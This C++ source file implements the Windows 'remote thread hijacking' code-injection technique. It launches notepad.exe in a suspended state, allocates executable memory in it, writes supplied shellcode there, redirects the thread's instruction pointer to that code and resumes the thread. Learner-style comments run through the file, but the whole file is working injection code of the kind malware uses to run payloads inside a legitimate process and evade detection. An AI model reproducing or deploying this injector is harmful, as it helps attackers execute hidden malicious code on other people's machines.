// p


#include <iostream>
#include "remote_thread_hijacking.h"

void remote_thread_hijacking(const unsigned char* shellcode, size_t shellcode_size, DWORD pid){
    //Create A suspended process for us to hijack 
    //So we create process and suspend it for us to perfrom thread hijacking

    // According to the documentation i read when using create process a we need
    // to give windows two structures
    // STARTUPINFO and PROCESS INFORMATION
    // STARTUPINFO tells window how to setup the process we are creating
    // PROCESS INFORMATION gives us back info about the process we created like its handle and id
    
    STARTUPINFOA Si = {0};
    PROCESS_INFORMATION Pi = {0};

    // to fix this error 
    // error call of an object of a class type without appropriate operator() or conversion functions to pointer-to-function typeC/C++(980)
     
 
    // declare the size of the startupinfo structure
    Si.cb = sizeof(STARTUPINFO);

//     BOOL CreateProcessA(
//   [in, optional]      LPCSTR                lpApplicationName,
//   [in, out, optional] LPSTR                 lpCommandLine,
//   [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
//   [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
//   [in]                BOOL                  bInheritHandles,
//   [in]                DWORD                 dwCreationFlags,
//   [in, optional]      LPVOID                lpEnvironment,
//   [in, optional]      LPCSTR                lpCurrentDirectory,
//   [in]                LPSTARTUPINFOA        lpStartupInfo,
//   [out]               LPPROCESS_INFORMATION lpProcessInformation
// );

    BOOL bCreate = CreateProcessA(
        NULL, // no application name
        (LPSTR)"C:\\Windows\\System32\\notepad.exe", // command line to launch notepad
        NULL, // default process security attributes
        NULL, // default thread security attributes
        FALSE, // do not inherit handles
        CREATE_SUSPENDED, // create the process in a suspended state
        NULL, // use the parent's environment
        NULL, // use the parent's current directory
        &Si, // pointer to STARTUPINFO structure
        &Pi // pointer to PROCESS_INFORMATION structure
    );

    // from the PI we created we can extract the basics we need like handle and pid
    auto hProcess = Pi.hProcess;
    DWORD ProcessId = Pi.dwProcessId;
    auto hThread = Pi.hThread;
    DWORD ThreadId = Pi.dwThreadId;
    // DWORD OldProtection = NULL;


    // allocate memory in the target process
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if(hMemory == NULL){
        std::cout << "Welp we failed to reserve memeory in target process, the resason is: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // write the shellcode to the allocated memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        shellcode,
        shellcode_size,
        &bytesWritten
    );

    std::cout << "Wrote " << bytesWritten << " bytes to memory in target process" << std::endl;


    CONTEXT ctx{};

    //getting the context of the remote thread
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(
        hThread,
        &ctx
    );

    // modifying the instruction pointer to point to our shellcode
    ctx.Rip = (DWORD64)hMemory; // for x64 systems, use Eip for x86

    // setting the modified context back to the remote thread
    SetThreadContext(
        hThread,
        &ctx
    );

    // resume the remote thread to execute the shellcode
    ResumeThread(
        hThread
    );

    std::cout << "Successfully hijacked remote thread with ID: " << ThreadId << std::endl;

    // wait for the remote process to finish
    WaitForSingleObject(
        hProcess, 
        INFINITE
    );


    // if(hThread == NULL){
    //     std::cout << "Welp we failed to create the remote thread, the resason is: " << GetLastError() << std::endl;
    //     VirtualFreeEx(hProcess, hMemory, 0, MEM_RELEASE);
    //     CloseHandle(hProcess);
    //     return;
    // }

    // std::cout << "Successfully created remote thread with ID: " << ThreadId << std::endl;

    // // cleanup
    // CloseHandle(hThread);
    // CloseHandle(hProcess);
}